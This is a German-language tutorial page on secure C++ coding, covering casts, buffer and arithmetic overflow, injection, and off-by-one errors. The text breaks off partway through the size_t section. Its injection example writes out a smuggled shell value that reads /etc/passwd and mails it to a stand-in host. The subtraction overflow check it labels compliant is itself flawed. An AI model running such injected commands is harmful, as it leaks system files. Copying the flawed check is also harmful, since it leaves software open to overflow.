# Schutzmaßnahmen für *Secure Programming*

[Zurück](./Readme_Secure_Programming.md)

---

## Inhalt

### Einige wichtige Tipps zum Schreiben von sicherem C++&ndash;Code <!-- Zu den folgende Abschnitten gibt es keinen Quellcode -->

  * [Verwende RAII](#link1)
  * [Verwende *Smart Pointer*](#link2)
  * [Verwende das Schlüsselwort `auto`](#link3)
  * [Verwende *Exception Handling*](#link4)
  * [Verwende die neuesten C++-Standards](#link5)
  * [Verwende sichere Bibliotheken](#link6)
  * [Verwende starke Typisierung](#link7)
  * [Verwende nur *Named Casts* bzw. *New-Style-Casts* zur Typkonvertierung](#link8)

### Einige konkrete Schutzmaßnahmen  <!-- Zu den folgende Abschnitten gibt es Quellcode -->

  * [Don't use C &ndash; use C++](#link9)
  * [Verwende mehrere Compiler](#link10)
  * [*Warnings* und *Errors*](#link11)
  * [Warning Level](#link12)
  * [Typensicherheit: Datentypen sind unsere Freunde](#link13)
  * [Erster Tipp für Pufferüberlauf: Exaktes Arbeiten](#link14)
  * [Zweiter Tipp für Pufferüberlauf: Verwende ausschließlich &bdquo;*secure*&rdquo; Funktionen](#link15)
  * [Drei Tipps für arithmetischen Überlauf](#link16)
  * [Noch ein Tipp für arithmetischen Überlauf: `std::midpoint`](#link17)
  * [Verhindere ungültige Zeichenketteninjektionen (sogenannte *SQL Injections*)](#link18)
  * [Vermeide &bdquo;*Off-by-One*&rdquo; Fehler!](#link19)
  * [Verwende STL-Algorithmen](#link20)
  * [Verwende STL-Container](#link21)
  * [Achte auf sicheres *Downcasting*](#link22)
  * [Verzichte auf die direkte Verwendung des `new`-Operators](#link23)
  * [Deklariere Konstruktoren mit einem einzigen Argument mit `explicit`](#link24)
  * [Elementare Datentypen haben keine Bedeutung (*Semantics*), nur Wertebereiche](#link25)
  * [Der Datentyp `size_t`](#link26)
  * [Benutzerdefinierte Literale: Elementare Datentypen &bdquo;mit Bedeutung&rdquo;](#link27)
  * [Schlüsselwörter `virtual`, `override` oder `final`](#link28)
  * [Setze standardmäßig Methoden auf `const`, soweit möglich](#link29)
  * [Verwende das Attribut `[[nodiscard]]`](#link30)

---

#### Quellcode

[*SecureProgrammingAdvices.cpp*](SecureProgrammingAdvices.cpp)<br />

---

## Einige wichtige Tipps zum Schreiben von sicherem C++&ndash;Code

### Verwenden Sie RAII <a name="link1"></a>

RAII steht für *Resource Acquisition Is Initialization* (*Ressourcenerwerb ist Initialisierung*).

Damit möchte man zum Ausdruck bringen, dass Ressourcen automatisch erworben werden,
wenn ein Objekt erstellt wird, und automatisch freigegeben werden, wenn das Objekt zerstört wird.

Verwenden Sie RAII, um Ressourcen Lecks und Speicherfehler zu vermeiden.

### Verwende *Smart Pointer* <a name="link2"></a>

C++ *Smart Pointer* können durchaus mit dem RAII Prinzip verglichen werden.
*Smart Pointer* Objekte verwalten die Speicherzuweisung und -freigabe automatisch.

Verwenden Sie *Smart Pointer*, um Speicherlecks und &bdquo;Dangling&rdquo;&ndash;Zeiger zu vermeiden.

### Verwende das Schlüsselwort `auto` <a name="link3"></a>

Verwende das Schlüsselwort `auto`, um Typkonflikte zu vermeiden und um den Code übersichtlicher
und weniger fehleranfällig zu machen.


### Verwende *Exception Handling* <a name="link4"></a>

Die Standard C++ Ausnahmebehandlung ist eine Möglichkeit, Fehler und Ausnahmen im laufenden Programm zu behandeln.

Verwenden Sie die Ausnahmebehandlung, um Fehler abzufangen, zu behandeln und zu verhindern,
dass das Programm abstürzt.

### Verwende die neuesten C++-Standards <a name="link5"></a>

Die neuesten C++-Standards enthalten viele Sicherheitsverbesserungen gegenüber früheren Sprachversionen.

Verwenden Sie immer die neuesten Standards, um diese Verbesserungen zu nutzen.

### Verwende sichere Bibliotheken <a name="link6"></a>

Verwenden Sie sichere Bibliotheken, die auf Sicherheit getestet und verifiziert wurden.

Vermeiden Sie die Verwendung von Bibliotheken von Drittanbietern, die nicht auf Sicherheitslücken geprüft wurden.

### Verwende starke Typisierung <a name="link7"></a>

Starke Typisierung (*Strong Typing*) stellt sicher, dass Variablen nur für den vorgesehenen Zweck verwendet werden.

Der Gebrauch von `void*`&ndash;Zeigern kann nur die &bdquo;Ultima Ratio&rdquo; sein, da auf diese Weise jegliche Typprüfung umgangen wird.

Vorbei sollte auch generell die Praxis sein, mit Hilfe des Castings eine strenge Typprüfung zu umgehen.

Die unsachgemäße Verwendung von `void*` und Casting kann zum Lesen fehlerhafter Daten führen,
was dann auch mit schlechten Intentionen ausgenutzt werden kann.

Verwenden Sie starke Typisierung, um Typangriffe (zum Beispiel durch unsichere Cast-Operationen)
und andere Sicherheitslücken zu verhindern.

### Verwende nur *Named Casts* bzw. *New-Style-Casts* zur Typkonvertierung <a name="link8"></a>

C++ kennt fünf verschiedene Typkonvertierungsmöglichkeiten:

  * `static_cast`:<br />Am wenigsten schädlich, kann Zeiger downcasten.

  * `const_cast`:<br />Entfernt den `const`-Modifikator. Bei falscher Anwendung kann dies fatal sein, da das Ziel möglicherweise tatsächlich `const` ist und ungültige Zugriffsfehler auftreten.

  * `dynamic_cast`:<br />Sicheres Down-/Cross-Casting zwischen Klassen, erfordert *RTTI* (Run-Time Type Information) &ndash; und RTTI ist in C++ oft gar nicht aktiviert.

  * `reinterpret_cast`:<br />Castet alles mit gleicher Größe, z. B. `int` in `MyClass*` auf 32-Bit-Rechnern.
    Dies ist kein echter Cast mehr, sondern nur eine Möglichkeit, dem Compiler mitzuteilen, dass er Typinformationen verwerfen und die Daten anders behandeln soll.

  * *C-Style-Casting* unter Verwendung der `(type) variable` Syntax:<br />
  Die problematischste Erfindung aller Zeiten. Es werden die folgenden Casts in dieser Reihenfolge versucht:<br />
  `const_cast`<br />
  `static_cast`<br />
  `static_cast` gefolgt von `const_cast`<br />
  `reinterpret_cast`<br />
  `reinterpret_cast` gefolgt von `const_cast`

Die Faustregel lautet:

  * Verwenden Sie niemals `reinterpret_cast` oder *C-Style-Casting*!

  * Wenn Sie Zeiger konvertieren müssen, casten Sie diese über `void*` und verwenden Sie `reinterpret_cast` nur,
  wenn es unbedingt nötig ist &ndash; das heißt, wenn Sie die Daten wirklich neu interpretieren müssen.

---

## Einige konkrete Schutzmaßnahmen

### Don't use C &ndash; use C++ <a name="link9"></a>

*Beschreibung*:

[CPL.1: Prefer C++ to C](https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#cpl1-prefer-c-to-c)

Sollten Sie die Wahl haben: Verwenden Sie C++ und nicht C.

Warum: C++ bietet bessere Typprüfungsmöglichkeiten und attraktivere Möglichkeiten in der Formulierung von Quellcode.
C++ ermöglicht bessere Unterstützung für die Programmierung auf höherer Ebene
und generiert häufig schnelleren Code.

Diese Aussage findet sich auch in den [C++ Core Guidelines](https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines)
wieder: *Prefer C++ to C* (*CPL.1*).

Zur Illustration vergleiche man die Konkatenation zweier Zeichenketten:
Einmal in C++ geschrieben und ein zweites Mal in C:

*Beispiel*: C

```cpp
01: char first[] = "Hello ";
02: char second[] = "World";
03: char result[20];
04: 
05: strcpy_s(result, 20, first);
06: strcat_s(result, 20, second);
07: std::printf("%s\n", result);
```

*Beispiel*: C++

```cpp
01: std::string first{ "Hello " };
02: std::string second{ "World" };
03: std::string result{ first + second };
04: std::println("{}", result);
```

---

### Verwende mehrere Compiler <a name="link10"></a>

Alle C/++ Compiler übersetzen lt. Definition C/C++&ndash;Quellcode in Maschinencode.
Dennoch bedeutet das noch lange nicht, dass es hier keine Unterschiede gibt.

Je komplexeren Quellcode Sie schreiben, umso mehr kann es sein, dass ein Compiler ein Programm ohne Warnungen und Fehlermeldungen
akzeptiert und übersetzt, ein anderer Compiler hingegen mit Warnungen oder im Extremfall sogar mit Fehlermeldungen reagiert.

Es empfiehlt sich daher, eine Code-Basis mit mehreren Compiler übersetzungsfähig zu halten.
Dies minimiert mögliche Nischenprobleme des einen oder anderen Übersetzers.
 
---

### *Warnings* und *Errors* <a name="link11"></a>

Vermutlich durften Sie diesen Hinweis schon oft über sich ergehen lassen:
Vermeiden Sie &ndash; so gut es geht &ndash; jegliche Warnungen, die ihr Übersetzer in ihrem Projekt erzeugt.
In den meisten Fällen ist eine Warnung ein Hinweis, dass mit Ihrem Quellcode an dieser Stelle etwas nicht in Ordnung ist.
Nehmen Sie Warnungen nicht auf die leichte Schulter:

Eine Kostprobe:

```
Warning C4047 : '=': 'int' differs in levels of indirection from 'int *'
```

Dies wird zwar vom C/C++ Compiler als Warnung eingestuft, es handelt sich hierbei aber um einen beinharten Fehler!

*Bemerkung*:<br />
Über *Errors* müssen wir nicht so viel reden: Beim Vorhandensein von Fehlern ist ein Programm überhaupt nicht übersetzungsfähig!

---

### Warning Level <a name="link12"></a>

Der *Warning Level* gibt an, welche Compilerwarnungen angezeigt werden sollen und welches Warnverhalten während der gesamten Kompilierung gelten soll.

Je höher Sie den *Warning Level* einstellen, desto mehr Warnungen werden angezeigt:

<img src="WarningLevel.png" width="700">

*Abbildung* 1: Unterschiedliche *Warning Level* des Visual C++ Compilers.

Sicherlich machen Sie die Beobachtung, dass bei vergleichsweise großem Warning Level sehr viele bisweilen pedantische Warnungen erzeugt werden.
Hier muss man sich für eine Gratwanderung entscheiden: Ein zu kleiner Warning Level ist schlecht für die Qualität des Programms,
ein zu großer Warning Level kann zu viele Warnungen erzeugen, die nicht unbedingt hilfreich sind.

---

### Typensicherheit: Datentypen sind unsere Freunde <a name="link13"></a>

Eine Stärke der beiden Programmiersprachen C/C++ ist, dass beide das Konzept von &bdquo;Datentypen&rdquo; beherzigen.

  * Man sollte tunlichst vermeiden, `void*` einzusetzen bzw. damit eine Typprüfung zu umgehen.

  * Man sollte die Praxis des *Castings* vermeiden oder nur sehr behutsam einsetzen, um damit eine starke Typprüfung zu umgehen.

  * Ein Downcasting durch `reinterpret_cast` oder auf der Basis von C-Style-Casting sollte vermieden werden.

  * Entfernen Sie *Constness* nicht mit `const_cast` oder mit C-Style-Casting, nur weil Sie es wollen oder der Compiler es erlaubt.

  * C-Style-Casting, Zeiger-Casting und `reinterpret_cast` sind im Allgemeinen riskant und können eine Quelle für ausnutzbare Fehler sein.

  * In diesem Sinne ist es besser, mit starken Typen zu arbeiten!

---

### Erster Tipp für Pufferüberlauf: Exaktes Arbeiten <a name="link14"></a>

Wir betrachten diese &ndash; leicht ironische, aber dennoch ernst gemeinte &ndash; Aussage
an einem Beispiel:

*Beispiel*: Einlesen der Kommandozeile - keine optimale Lösung

```cpp
01: void test(int argc, const char* argv[])
02: {
03:     char cmdLine[4096];
04: 
05:     cmdLine[0] = '\0';
06: 
07:     for (int i = 1; i < argc; ++i) {
08:         strcat(cmdLine, argv[i]);
09:         strcat(cmdLine, " ");
10:     }
11: 
12:     std::println("cmdLine: >{}<", cmdLine);
13: }
```

Erkennen Sie die Schwachstellen an diesem Code-Fragment?


*Beispiel*: Einlesen der Kommandozeile - bessere Lösung

```cpp
01: void evaluateArgs(int argc, const char* argv[])
02: {
03:     size_t bufsize = 0;
04:     size_t buflen = 0;
05: 
06:     char* cmdLine = NULL;
07: 
08:     for (int i = 1; i < argc; ++i) {
09: 
10:         const size_t len = strlen(argv[i]);
11: 
12:         if (bufsize - buflen <= len) {
13: 
14:             bufsize = (bufsize + len) * 2;
15: 
16:             char* ptr = (char*)realloc(cmdLine, bufsize);
17:             if (ptr == NULL) {
18:                 free(cmdLine);
19:                 exit(-1);
20:             }
21: 
22:             cmdLine = ptr;
23:         }
24: 
25:         memcpy(cmdLine + buflen, argv[i], len);
26:         buflen += len;
27:         cmdLine[buflen++] = ' ';
28:     }
29: 
30:     if (cmdLine != NULL) {
31:         cmdLine[buflen] = '\0';
32:     }
33: 
34:     std::println("cmdLine: >{}<", cmdLine);
35: 
36:     free(cmdLine);
37: }
```

*Ausgabe*:

```
cmdLine: >one two three four <
```

Die erste vorgestellte Variante verwendet für das Einlesen einen Puffer statischer Länge.

Prinzipiell ist das machbar, aber es stellt eben keine perfekte Lösung dar.

Zum einen sollten zu große statische Datenbereiche nicht auf dem Stack vorhanden sein,
zum anderen ist man immer mit dem Problem konfrontiert, dass die übergebenen Datenbereiche umfangreicher sind.

Eine optimale Lösung lässt sich nur unter Einsatz der dynamischen Datenverwaltung erzielen.

---

### Zweiter Tipp für Pufferüberlauf: Verwende ausschließlich &bdquo;*secure*&rdquo; Funktionen <a name="link15"></a>

*Beispiel*: `strncpy_s` an Stelle von `strncpy`

```cpp
01: void test() {
02: 
03:     char buffer[16];
04: 
05:     const char* str = "This is way too long for this buffer";
06:     std::println("Source:      >{}<", str);
07: 
08:     auto length = strlen(str);
09:     auto size = std::size(buffer);
10: 
11:     // strncpy_s(buffer, size, str, length);      // crashes
12:     strncpy_s(buffer, size, str, size - 1);       // copy with adjusted boundary
13: 
14:     buffer[size - 1] = '\0';
15:     std::println("Destination: >{}<", buffer);
16: }
```

*Ausgabe*:

```
Source:      >This is way too long for this buffer<
Destination: >This is way too<
```

*Beispiel*: `snprintf` an Stelle von `sprintf`

```cpp
01: void test() {
02: 
03:     const int Size = 64;
04: 
05:     char buffer[Size];
06: 
07:     auto bytesWritten = 0;
08: 
09:     bytesWritten = snprintf(buffer, Size, "The half of %d is %d", 60, 60/2);
10: 
11:     if (bytesWritten >= 0 && bytesWritten < Size) {    // check returned value
12: 
13:         bytesWritten = snprintf(buffer + bytesWritten, Size - bytesWritten, ", and the half of that is %d.", 60/2/2);
14:     }
15: 
16:     std::println("Buffer: >{}< // Bytes written: {}", buffer, bytesWritten);
17: }
```

*Ausgabe*:

```
Buffer: >The half of 60 is 30, and the half of that is 15.< // Bytes written: 29
```

Es gibt für die CRT (*C-Runtime Library*) eine Überarbeitung der meisten Funktionen,
um deren Parameter besser überprüfen zu können:

[Security Features in the CRT](https://learn.microsoft.com/en-us/cpp/c-runtime-library/security-features-in-the-crt?view=msvc-170)


Die Menge aller Modifikationen an den ursprünglichen Funktionen ist hier beschrieben:

[Security-enhanced versions of CRT functions](https://learn.microsoft.com/en-us/cpp/c-runtime-library/security-enhanced-versions-of-crt-functions?view=msvc-170)


---

## Drei Tipps für arithmetischen Überlauf <a name="link16"></a>

Für den arithmetischen Überlauf kann man &ndash; in einem ersten Ansatz &ndash;
mit gewissen Ad-hoc-Lösungen reagieren.

Ein vollständiger Lösungsansatz findet sich [hier](../SafeInt/Readme_SafeInt.md).

Wir stellen nun drei Workarounds vor, um einen arithmetischen Überlauf zu verhindern.

Im Großen und Ganzen kann man sagen, dass man die kritischen Operationen zunächst vermeiden oder
umgehen muss. Bei der Addition und Subtraktion ist das durchaus möglich, man kann durch geschicktes Umordnen
des arithmetischen Ausdrucks einen Überlauf verhindern.

Bei der Multiplikation ist das Ganze etwas komplizierter. Ein Ansatz besteht darin, auf den nächstgrößeren Wertebereich umzusteigen,
sofern dies noch möglich ist.


*Beispiel*: Addition

```cpp
01: void test_arithmetic_overflow_addition() {
02: 
03:     std::uint32_t a;
04:     std::uint32_t b;
05:     std::uint32_t sum;
06: 
07:     // ....
08:     sum = a + b;
09: }
10: 
11: void addition_compliant(std::uint32_t a, std::uint32_t b) {
12: 
13:     std::uint32_t sum = 0;
14: 
15:     if (std::numeric_limits<std::uint32_t>::max() - a < b)
16:     {
17:         // test for UIntMax - a < b: handle error condition
18:         std::println("Sum of {} and {} is too large, cannot add !", a, b);
19:     }
20:     else
21:     {
22:         sum = a + b;
23:         std::println("{} + {} = {}", a, b, sum);
24:     }
25: }
26: 
27: void test() {
28: 
29:     // for example
30:     std::uint32_t a = std::numeric_limits<std::uint32_t>::max() / 2;
31:     std::uint32_t b = std::numeric_limits<std::uint32_t>::max() / 2;
32: 
33:     addition_compliant(a, b);
34: 
35:     a = a + 1;
36: 
37:     addition_compliant(a, b);
38: 
39:     a = a + 1;
40: 
41:     addition_compliant(a, b);
42: }
```


*Ausgabe*:

```
2147483647 + 2147483647 = 4294967294
2147483648 + 2147483647 = 4294967295
Sum of 2147483649 and 2147483647 is too large, cannot add !
```


*Beispiel*: Subtraktion

```cpp
01: void test_arithmetic_overflow_subtraction() {
02: 
03:     std::int32_t a;
04:     std::int32_t b;
05:     std::int32_t sum;
06: 
07:     // ....
08:     sum = a - b;
09: }
10: 
11: void subtraction_compliant(std::int32_t a, std::int32_t b) {
12: 
13:     int32_t result = 0;
14: 
15:     if (b > 0 && a < std::numeric_limits<std::int32_t>::max() + b ||
16:         b < 0 && a > std::numeric_limits<std::int32_t>::max() + b)
17:     {
18:         std::println("Cannot subtract {} from {}! !", b, a);
19:     }
20:     else
21:     {
22:         result = a - b;
23:         std::println("{} - {} = {}", a, b, result);
24:     }
25: }
26: 
27: void test() {
28: 
29:     std::uint32_t a = std::numeric_limits<std::int32_t>::min() / 2;
30:     std::uint32_t b = std::numeric_limits<std::int32_t>::max() / 2;
31: 
32:     subtraction_compliant(a, b);
33: 
34:     b = std::numeric_limits<std::int32_t>::max();   // removed "/ 2"
35: 
36:     subtraction_compliant(a, b);
37: }
```

*Ausgabe*:

```
-1073741824 - 1073741823 = -2147483647
Cannot subtract 2147483647 from -1073741824! !
```



*Beispiel*: Multiplikation

```cpp
01: void test_arithmetic_overflow_multiplication() {
02: 
03:     std::int32_t a;
04:     std::int32_t b;
05:     std::int32_t sum;
06: 
07:     // ....
08:     sum = a * b;
09: }
10: 
11: int32_t multiplication_compliant(std::int32_t a, std::int32_t b) {
12: 
13:     // want to switch from 32-bit to 64-bit arithmetic
14:     static_assert (sizeof (int64_t) >= 2 * sizeof(int32_t));
15: 
16:     std::int32_t result = 0;
17: 
18:     int64_t product = static_cast<int64_t>(a) * static_cast<int64_t>(b);
19: 
20:     // result needs to be represented as a 32-bit (std::int32_t) integer value (!)
21:     if (product > std::numeric_limits<std::int32_t>::max() || product < std::numeric_limits<std::int32_t>::min()) {
22: 
23:         std::println("Cannot multiply {} with {}! !", a, b);
24:     }
25:     else {
26:         result = static_cast<int32_t>(product);
27:         std::println("{} * {} = {}", a, b, result);
28:     }
29: 
30:     return result;
31: }
32: 
33: void test() {
34: 
35:     std::int32_t a = 2;
36:     std::int32_t b = 1;
37: 
38:     for (int i = 1; i < 32; ++i) {
39: 
40:         b = multiplication_compliant(a, b);
41:     }
42: }
```

*Ausgabe*:

```
2 * 4 = 8
2 * 8 = 16
2 * 16 = 32
2 * 32 = 64
2 * 64 = 128
2 * 128 = 256
2 * 256 = 512
2 * 512 = 1024
2 * 1024 = 2048
2 * 2048 = 4096
2 * 4096 = 8192
2 * 8192 = 16384
2 * 16384 = 32768
2 * 32768 = 65536
2 * 65536 = 131072
2 * 131072 = 262144
2 * 262144 = 524288
2 * 524288 = 1048576
2 * 1048576 = 2097152
2 * 2097152 = 4194304
2 * 4194304 = 8388608
2 * 8388608 = 16777216
2 * 16777216 = 33554432
2 * 33554432 = 67108864
2 * 67108864 = 134217728
2 * 134217728 = 268435456
2 * 268435456 = 536870912
2 * 536870912 = 1073741824
Cannot multiply 2 with 1073741824! !
```

---

### Noch ein Tipp für arithmetischen Überlauf: `std::midpoint` <a name="link17"></a>

Die Funktion `std::midpoint()` berechnet den Mittelpunkt von zwei ganzen Zahlen
oder zwei Gleitkommazahlen:

*Beispiel*:

```cpp
01: void test() {
02: 
03:     std::uint32_t a = std::numeric_limits<std::uint32_t>::max();
04:     std::uint32_t b = std::numeric_limits<std::uint32_t>::max() - 2;
05: 
06:     std::println("a:                                 {}", a);
07:     std::println("b:                                 {}", b);
08:     std::println("Incorrect (overflow and wrapping): {}", (a + b) / 2);
09:     std::println("Correct:                           {}", std::midpoint(a, b));
10: }
```


*Ausgabe*:

```
a:                                 4294967295
b:                                 4294967293
Incorrect (overflow and wrapping): 2147483646
Correct:                           4294967294
```

---

### Verhindere ungültige Zeichenketteninjektionen (sogenannte *SQL Injections*) <a name="link18"></a>

Das Durchreichen von Zeichenketten an Subsysteme ist mit äußerster Vorsicht zu bewerkstelligen.

Sogenannte *SQL-Injection*-Angriffe sind eine der ältesten Schwachstellen in derartigen Programmen.

Eine SQL-Injection ist eine Art von Sicherheitslücke,
bei der ein Angreifer einen Teil des SQL-Codes (*Structured Query Language*) verwendet,
um eine Datenbank zu manipulieren und um Zugriff auf potenziell wertvolle Informationen zu erhalten.
Dies ist eine der häufigsten und bedrohlichsten Angriffsarten, da sie potenziell gegen jedes Programm oder jede Webseite eingesetzt werden kann.

Neben SQL-Injektionen kann die Zeichenkette auch ein (Unix/Linux)-Shell-Kommando darstellen,
was an dieser Stelle ebenfalls einen Angriff darstellt.

*Beispiel*:

```cpp
01: void do_injection(const char* addr) {
02: 
03:     char buffer[256];
04: 
05:     sprintf(buffer, "/bin/mail %s < /tmp/email", addr);
06:     system(buffer);
07: }
08: 
09: void test() {
10:     do_injection("bogus@addr.com; cat /etc/passwd | mail somebadguy.net");
11: }
```

*Ausgabe*:

```
Buffer (Input):   /bin/mail bogus@addr.com; cat /etc/passwd | mail somebadguy.net < /tmp/email
```

*Lösung*:

Jegliche Form einer Benutzereingabe ist zu validieren!

In diesem Zusammenhang gibt es den Begriff der &bdquo;Whitelist&rdquo;:
Hierunter versteht man eine Art &bdquo;weiße Liste&rdquo;, eine Art Filter,
der die sicheren Daten beschreibt und filtert.

*Beispiel*:

```cpp
01: void clean_input(char* input) {
02: 
03:     static char ok_chars[] =
04:         "abcdefghijklmnopqrstuvwxyz"
05:         "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
06:         "1234567890_-@";
07: 
08:     char* begin = input;
09:     char* end = input + strlen(input);
10: 
11:     begin += strspn(begin, ok_chars);
12: 
13:     while (begin != end) {
14:         *begin = '_';
15:         begin += strspn(begin, ok_chars);
16: 
17:     }
18: }
19: 
20: void do_injection_safe(const char* addr) {
21: 
22:     char buffer[256];
23: 
24:     sprintf(buffer, "/bin/mail %s < /tmp/email", addr);
25:     std::println("Buffer (Input):   {}", buffer);
26: 
27:     clean_input(buffer);
28:     std::println("Buffer (Cleaned): {}", buffer);
29: 
30:     system(buffer);
31: }
32: 
33: void test() {
34:     do_injection_safe("bogus@addr.com; cat /etc/passwd | mail somebadguy.net");
35: }
```

Die sogenannte &bdquo;Whitelist&rdquo; finden wir in dem Programmausschnitt
in den Zeilen 4 bis 6 vor: Eine Menge aller zulässigen Zeichen in diesem Beispiel.

*Ausgabe*:

```
Buffer (Input):   /bin/mail bogus@addr.com; cat /etc/passwd | mail somebadguy.net < /tmp/email
Buffer (Cleaned): _bin_mail_bogus@addr_com__cat__etc_passwd___mail_somebadguy_net____tmp_email
```


---

### Vermeide &bdquo;*Off-by-One*&rdquo; Fehler! <a name="link19"></a>

Vermeiden Sie &bdquo;*Off-by-One*&rdquo; Fehler!
Natürlich ist das leichter getan als gesagt. 

Eine Option besteht &ndash; wenngleich das für das gesamte Spektrum der Entwicklung von Software gilt &ndash; darin,
jede Zeile des Quellcodes mit dem Debugger zu durchlaufen!


*Frage*: Wieviele &bdquo;*Off-by-One*&rdquo; Fehler entdecken Sie in diesem Codefragment:

```cpp
01: void test() {
02: 
03:     char source[10];
04:     strcpy(source, "0123456789");
05: 
06:     char* dest = (char*)malloc(strlen(source));
07:             
08:     int i;
09:     for (i = 1; i <= 11; i++)
10:     {
11:         dest[i] = source[i];
12:     }
13:     dest[i] = '\0';
14: 
15:     std::println("Dest: {}", dest);
16: }
```

*Antwort*:

Die folgenden Zeilen sind entweder falsch oder extrem unsicher geschrieben:

  * Zeile 4
  * Zeile 6
  * Zeile 11
  * Zeile 13

---

### Verwende STL-Algorithmen <a name="link20"></a>

Algorithmen der STL sind robuster im Gebrauch als CRT-Bibliotheksfunktionen oder selbst geschriebene Funktionen.

*Beispiel (C++)*:

```cpp
01: std::string str{ "Hello World" }; // use also "Hello:World"
02: std::println("{}", str);
03: 
04: auto isColon = [] (int ch) { return ch == ':'; };
05: 
06: auto pos = std::find_if(str.begin(), str.end(), isColon);
07: 
08: // if found - delete everything afterwards
09: if (pos != str.end()) {
10:     str.erase(pos, str.end());
11: }
12: 
13: std::println("{}", str);
```


*Beispiel (C)*:

```cpp
01: char str[] = "Hello World";    // use also "Hello:World"
02: std::printf("%s\n", str);
03: 
04: const char* pos = strstr(str, ":");
05: 
06: if (pos != NULL) {
07: 
08:     // if found - poke '\0' into string - this deletes everything afterwards
09:     size_t ofs = pos - str;
10:     str[ofs] = '\0';
11: }
12: 
13: std::printf("%s\n", str);
```

*Hinweis*:
Vermeiden Sie generell *manuelle* Wiederholungsschleifen!

Verwenden Sie Algorithmen der STL und, wenn es eine Wiederholungsschleife sein muss, die sogenannten C++ *Range-based Loop*:
Beide kommen ohne Schleifen-Indizes aus, die eine häufige Ursache von Fehlerquellen sind.

---

### Verwende STL-Container <a name="link21"></a>

*Beispiel*:

  * `std::string`
  * `std::vector`

---

### Achte auf sicheres *Downcasting* <a name="link22"></a>

An Stelle der unsicheren C-Cast Operatoren sollte man die sicheren C++-Cast Operatoren verwenden.

Ein Beispiel ist der Gebrauch von `static_cast`:

*Beispiel (C++)*:

```cpp
01: class Spiderman {};
02: class Ironman {};
03: 
04: void test() {
05: 
06:     Spiderman* ptr = new Spiderman;
07:     Ironman* ptr2 = nullptr;
08: 
09:     // compile error: 'static_cast': cannot convert from 'Spiderman *' to 'Ironman *'
10:     ptr2 = static_cast<Ironman*>(ptr);
11: }
```

*Beispiel (C)*:

```cpp
01: struct Spiderman {};
02: struct Ironman {};
03: 
04: void test() {
05: 
06:     struct Spiderman* ptr = (struct Spiderman*) malloc(sizeof(struct Spiderman));
07:     struct Ironman* ptr2 = NULL;
08: 
09:     // warning C4133: '=': incompatible types - from 'Spiderman *' to 'Ironman *'
10:     // this line compiles (!!!) using a C Compiler (needs a file with extension .c)
11:     ptr2 = (struct Spiderman*)ptr;
12: }
```

Das letzte Code-Fragment ist in C übersetzungsfähig !!! 
Dabei müssen diese Anweisungen natürlich in einer Datei mit der Endung &bdquo;.c&rdquo; stehen.

Dieselben Anweisungen sind in C++ nicht übersetzungsfähig!

---

### Verzichte auf die direkte Verwendung des `new`-Operators <a name="link23"></a>

Siehe hierzu das entsprechende 
[C++ Core Guideline](https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines)
mit dem Titel *Avoid calling new and delete explicitly* (*R.11*).

<img src="cpp_security_advice_no_new.svg" width="600">

*Abbildung* 2: `std::unique_ptr`-Variablen haben Charme.


<img src="cpp_security_advice_no_new_gc.svg" width="300">

*Abbildung* 3: Stack-Variablen haben Charme.

Am Ende des Tages stellt sich bei einem mit `new` erzeugten Zeiger immer die Frage:
Wer hat wann und wo `delete` aufgerufen?

---

### Deklariere Konstruktoren mit einem einzigen Argument mit `explicit` <a name="link24"></a>

Standardmäßig sollten Konstruktoren mit einem Argument als `explicit` deklariert werden.
Damit kann man unbeabsichtigte Konvertierungen &ndash; und damit Überraschungen &ndash; vermeiden:

```cpp
01: class String {
02: public:
03:     String(size_t length) : m_length{ length } {};   // Surprise :)
04:     // ...
05: 
06: private:
07:     size_t m_length;
08:     // ...
09: };
10:     
11: void test() {
12: 
13:     String s = '!';  // Uhhh: String of length 33
14: }
```

Fügt man das Schlüsselwort vor dem Konstruktor hinzu, ist die `test`-Funktion nicht mehr übersetzungsfähig:

```cpp
explicit String(size_t length) : m_length{ length } {}; 
```

---

### Elementare Datentypen haben keine Bedeutung (*Semantics*), nur Wertebereiche <a name="link25"></a>

Ein Datentyp wie `int` hat keine Bedeutung (*Semantik*).

Man kann nicht sagen, dass man das Alter eines Angestellten in einer `Employee`-Klasse mit
dem Typ `int` definieren sollte. `int`-Werte können sehr groß sein als auch negativ.
`size_t_`-Werte wiederum sind nicht negativ, aber können wieder extrem große Werte annehmen.

Es gibt die eine oder andere Möglichkeit, Werte mit einer Semantik zu verbinden:

  * Aufzählungstypen (`enum`-Klassen)
  * `std::string` Literale
  * Benutzerdefinierte Literale
  * `size_t`

*Beispiel*: `std::string` Literale

```cpp
01: void test() {
02: 
03:     using namespace std::literals::string_literals;
04: 
05:     auto heroes = { "Spiderman"s, "Ironman"s, "Wonder Woman"s };
06: 
07:     for (auto const& hero : heroes) {
08:         std::println("{:12} ({})", hero, hero.size());
09:     }
10: }
```

`enum`-Klassen sind typsichere Klassen.

*Beispiel*: `enum`-Klassen

```cpp
01: enum class RainbowColors : char
02: {
03:     Violet = 'V',
04:     Indigo = 'I',
05:     Blue   = 'B',
06:     Green  = 'G',
07:     Yellow = 'Y',
08:     Orange = 'O',
09:     Red    = 'R'
10: };
11: 
12: enum class EyeColors
13: {
14:     Blue,
15:     Green,
16:     Brown
17: };
18: 
19: void test() {
20: 
21:     std::cout << static_cast<std::underlying_type_t<RainbowColors>>(RainbowColors::Green) << std::endl;
22:     std::cout << static_cast<std::underlying_type_t<RainbowColors>>(RainbowColors::Orange) << std::endl;
23:     std::cout << static_cast<std::underlying_type_t<EyeColors>>(EyeColors::Blue) << std::endl;
24:     std::cout << static_cast<std::underlying_type_t<EyeColors>>(EyeColors::Green) << std::endl;
25: }
```

*Ausgabe*:

```
G
O
0
1
```

---

### Der Datentyp `size_t` <a name="link26"></a>

Der Name `size_t` bedeutet im Wesentlichen &bdquo;*size type*&rdquo;,
und man verwendet diesen Datentyp normalerweise dann,
um die Größe oder Länge von Dingen anzugeben &ndash; wie beispielsweise die Länge einer C-Zeichenfolge,
die von der Funktion `strlen()` zurückgegeben wird.

`size_t` ist keiner der &bdquo;integrierten&rdquo; Datentypen von C/C++.
Stattdessen wird er im Regelfall in Headerdateien mit `typedef` oder `using` definiert.

Der genaue Datentyp ist implementierungsspezifisch, ist aber normalerweise eine Form eines vorzeichenlosen ganzzahligen Datentyps.

Man sollte `size_t` einsetzen

  * für etwaige Größenangaben von Objekten,
  * für Container-ähnliche Objekte und deren Größe und
